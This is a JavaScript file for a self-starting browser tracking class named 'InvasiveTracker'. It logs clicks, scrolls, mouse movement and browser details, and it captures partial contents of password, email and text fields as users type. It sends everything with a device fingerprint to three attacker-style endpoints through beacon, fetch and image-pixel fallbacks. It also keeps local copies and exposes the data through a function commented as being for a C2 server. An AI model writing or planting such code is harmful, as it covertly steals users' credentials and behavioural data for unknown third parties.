// Comprehensive tracking and data collection
class InvasiveTracker {
  constructor() {
    this.trackedData = {
      pageViews: [],
      clicks: [],
      scrolls: [],
      inputs: [],
      movements: [],
      sessions: []
    };
    
    this.sessionStart = Date.now();
    this.startTracking();
  }
  
  startTracking() {
    this.trackPageView();
    this.trackClicks();
    this.trackScrolls();
    this.trackInputs();
    this.trackMouseMovements();
    this.trackSession();
    this.trackPerformance();
    this.trackErrors();
  }
  
  trackPageView() {
    const pageView = {
      url: window.location.href,
      referrer: document.referrer,
      timestamp: Date.now(),
      sessionDuration: 0
    };
    
    this.trackedData.pageViews.push(pageView);
    this.sendToAnalytics('pageview', pageView);
  }
  
  trackClicks() {
    document.addEventListener('click', (e) => {
      const clickData = {
        x: e.clientX,
        y: e.clientY,
        target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') +
          (e.target.className ? '.' + e.target.className.split(' ').join('.') : ''),
        timestamp: Date.now(),
        text: e.target.textContent?.substring(0, 100)
      };
      
      this.trackedData.clicks.push(clickData);
      
      // Send every 10 clicks
      if (this.trackedData.clicks.length % 10 === 0) {
        this.sendToAnalytics('clicks', this.trackedData.clicks.slice(-10));
      }
    }, true);
  }
  
  trackScrolls() {
    let lastScroll = 0;
    let scrollTimeout;
    
    window.addEventListener('scroll', () => {
      const scrollData = {
        x: window.scrollX,
        y: window.scrollY,
        maxScroll: Math.max(
          document.body.scrollHeight,
          document.documentElement.scrollHeight
        ) - window.innerHeight,
        timestamp: Date.now()
      };
      
      clearTimeout(scrollTimeout);
      scrollTimeout = setTimeout(() => {
        this.trackedData.scrolls.push(scrollData);
        this.sendToAnalytics('scroll', scrollData);
      }, 500);
    });
  }
  
  trackInputs() {
    document.addEventListener('input', (e) => {
      if (e.target.type === 'password' ||
        e.target.type === 'email' ||
        e.target.type === 'text') {
        
        const inputData = {
          field: e.target.name || e.target.id || 'unknown',
          type: e.target.type,
          valueLength: e.target.value.length,
          timestamp: Date.now(),
          partialValue: e.target.value.substring(0, 50) // Capture partial input
        };
        
        this.trackedData.inputs.push(inputData);
        this.sendToAnalytics('input', inputData);
      }
    }, true);
  }
  
  trackMouseMovements() {
    let movements = [];
    let movementTimeout;
    
    document.addEventListener('mousemove', (e) => {
      movements.push({
        x: e.clientX,
        y: e.clientY,
        timestamp: Date.now()
      });
      
      clearTimeout(movementTimeout);
      movementTimeout = setTimeout(() => {
        if (movements.length > 5) {
          this.trackedData.movements.push(...movements);
          this.sendToAnalytics('movements', movements);
          movements = [];
        }
      }, 1000);
    });
  }
  
  trackSession() {
    const sessionData = {
      start: this.sessionStart,
      userAgent: navigator.userAgent,
      screen: `${screen.width}x${screen.height}`,
      platform: navigator.platform,
      language: navigator.language
    };
    
    this.trackedData.sessions.push(sessionData);
    
    // Track visibility changes
    document.addEventListener('visibilitychange', () => {
      this.sendToAnalytics('visibility', {
        hidden: document.hidden,
        timestamp: Date.now(),
        sessionDuration: Date.now() - this.sessionStart
      });
    });
    
    // Send session data periodically
    setInterval(() => {
      this.sendToAnalytics('session_heartbeat', {
        duration: Date.now() - this.sessionStart,
        pageViews: this.trackedData.pageViews.length,
        clicks: this.trackedData.clicks.length
      });
    }, 60000);
  }
  
  trackPerformance() {
    if (window.performance && performance.getEntriesByType) {
      setTimeout(() => {
        const perfData = {
          navigation: performance.getEntriesByType('navigation')[0],
          paint: performance.getEntriesByType('paint'),
          resource: performance.getEntriesByType('resource').slice(0, 20)
        };
        
        this.sendToAnalytics('performance', perfData);
      }, 3000);
    }
  }
  
  trackErrors() {
    window.addEventListener('error', (e) => {
      this.sendToAnalytics('error', {
        message: e.message,
        filename: e.filename,
        lineno: e.lineno,
        colno: e.colno,
        timestamp: Date.now()
      });
    });
    
    window.addEventListener('unhandledrejection', (e) => {
      this.sendToAnalytics('promise_rejection', {
        reason: e.reason?.toString(),
        timestamp: Date.now()
      });
    });
  }
  
  sendToAnalytics(type, data) {
    const payload = {
      type: type,
      data: data,
      timestamp: Date.now(),
      sessionId: this.sessionStart,
      fingerprint: JSON.parse(localStorage.getItem('device_fingerprint') || '{}')
    };
    
    // Send to multiple tracking endpoints
    const endpoints = [
      'https://invasive-tracker.com/log',
      'https://data-harvester.pro/collect',
      'https://analytics.malicious/record'
    ];
    
    endpoints.forEach(endpoint => {
      // Use various techniques to ensure delivery
      this.sendData(endpoint, payload);
    });
    
    // Store locally for later retrieval
    this.storeLocally(type, payload);
  }
  
  sendData(endpoint, payload) {
    // Try Beacon API first
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
      navigator.sendBeacon(endpoint, blob);
      return;
    }
    
    // Fallback to fetch with no-cors
    fetch(endpoint, {
      method: 'POST',
      body: JSON.stringify(payload),
      mode: 'no-cors',
      keepalive: true
    }).catch(() => {});
    
    // Also use image pixel as backup
    const img = new Image();
    const encoded = btoa(encodeURIComponent(JSON.stringify(payload)));
    img.src = `${endpoint}?data=${encoded}&type=pixel`;
  }
  
  storeLocally(type, data) {
    try {
      const key = `tracked_${type}_${Date.now()}`;
      localStorage.setItem(key, JSON.stringify(data));
      
      // Clean up old entries (keep last 1000)
      const keys = Object.keys(localStorage).filter(k => k.startsWith('tracked_'));
      if (keys.length > 1000) {
        keys.sort().slice(0, keys.length - 1000).forEach(k => localStorage.removeItem(k));
      }
    } catch (e) {
      // Ignore storage errors
    }
  }
  
  // Method to retrieve all tracked data
  getAllTrackedData() {
    return {
      ...this.trackedData,
      localStorage: this.getStoredTrackingData(),
      sessionDuration: Date.now() - this.sessionStart
    };
  }
  
  getStoredTrackingData() {
    const data = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key.startsWith('tracked_')) {
        try {
          data[key] = JSON.parse(localStorage.getItem(key));
        } catch (e) {
          data[key] = localStorage.getItem(key);
        }
      }
    }
    return data;
  }
}

// Initialize tracker
window.invasiveTracker = new InvasiveTracker();

// Export data on demand (for C2 server)
window.getTrackingData = () => window.invasiveTracker.getAllTrackedData();